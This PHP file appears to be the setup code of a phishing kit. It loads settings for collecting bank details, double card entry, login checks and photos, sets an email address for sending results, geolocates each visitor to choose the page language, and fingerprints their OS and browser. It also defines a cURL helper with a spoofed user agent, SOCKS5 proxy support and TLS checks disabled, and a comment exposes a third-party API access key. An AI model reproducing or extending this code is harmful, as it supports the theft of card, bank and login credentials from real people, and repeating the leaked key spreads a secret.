
<?php

//error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$to = $setting['email'];
$autoblock = $setting['block'];
$backup = $setting['backup'];
$getphoto = $setting['get_photo'];
$get_bank = $setting['get_bank'];
$truelogin = $setting['true_login'];
$lockplatform = $setting['lock_platform'];
$double_cc = $setting['double_cc'];
$proxyblock = $setting['proxy_block'];
$site_pass = $setting['site_password'];
$passnya = $setting['password'];
$fromemail = $_SERVER['SERVER_NAME'];
// =============================================================================================


function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip2 = getUserIP();
//https://api.ipstack.com/36.82.102.111?access_key=e06d27ac9f91465b417e3cac71fcb8ec
$url = "https://ipapi.co/".$ip2."/json/";
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
//$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip2));
    $countryname = $details['country_name'];
    $countrycode = $details['country_code'];
    $cn = $countryname;
    $cid = $countrycode;
    if($setting['lock_lang'] == "JP") {
        $cid = "JP";
    }else if($setting['lock_lang'] == "ES") {
        $cid ="ES";
    }else if($setting['lock_lang'] == "CL") {
        $cid ="CL";
    }else if($setting['lock_lang'] == "FR") {
        $cid = "FR";
    }else if($setting['lock_lang'] == "CN") {
        $cid = "CN";
    }else if($setting['lock_lang'] == "DE") {
        $cid = "DE";
    }else if($setting['lock_lang'] == "MY") {
        $cid = "MY";
    }else if($setting['lock_lang'] == "MX") {
        $cid = "MX";
    }else if($setting['lock_lang'] == "AR") {
        $cid = "AR";
    }else if($setting['lock_lang'] == "PE") {
        $cid = "PE";
    }else if($setting['lock_lang'] == "PR") {
        $cid = "PR";
    }else if($setting['lock_lang'] == "CO") {
        $cid = "CO";
    }else if($setting['lock_lang'] == "PY") {
        $cid = "PY";
    }else if($setting['lock_lang'] == "UY") {
        $cid = "UY";
    }else if($setting['lock_lang'] == "CR") {
        $cid = "CR";
    }else if($setting['lock_lang'] == "EN") {
        $cid = "EN";
    }else{
        $cid = $countrycode;
    }

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

$os        =   getOS();

function curl($url = '', $var = null,$cheader=null,$cook=null,$ua=null,$to=null,$ref=null,$sock=null,$cs=false, $header = false, $nobody = false)
{
    $rans=rand(11,99);
    global $config, $sock;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_NOBODY, $nobody);
    curl_setopt($curl, CURLOPT_HEADER, $header);
        //curl_setopt($curl, CURLOPT_TIMEOUT, 20);
    if($ua!==null)
        $myua=$ua;
    else
        $myua='Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25';
    curl_setopt($curl, CURLOPT_USERAGENT, $myua);

    if($cheader!==null) {
        curl_setopt($curl,CURLOPT_HTTPHEADER,$cheader);
    }


    if ($var!==null) {

        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }

    if($sock!==null){
        curl_setopt($curl, CURLOPT_HTTPPROXYTUNNEL, 0);
        curl_setopt($curl, CURLOPT_PROXY, $sock);
        curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }
    if($to!==null)
        $myto=$to;
    else
        $myto=30;
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $myto);
    curl_setopt($curl, CURLOPT_TIMEOUT, $myto);


        //if($ref!==null)
        //curl_setopt($curl, CURLOPT_REFERER, 'https://www.google.com');
    if($cook!==null)
        $mycook=getcwd().'/cook/'.$cook;
    else
        $mycook=getcwd().'/cook/cook.txt';
    @unlink($mycook);
    curl_setopt($curl, CURLOPT_COOKIESESSION, true);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $mycook);
    curl_setopt($curl, CURLOPT_COOKIEFILE, $mycook);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_URL, $url);
    $result = curl_exec($curl);
    //$result[0] = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
        //@unlink($mycook);
    return $result;
}

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
?>
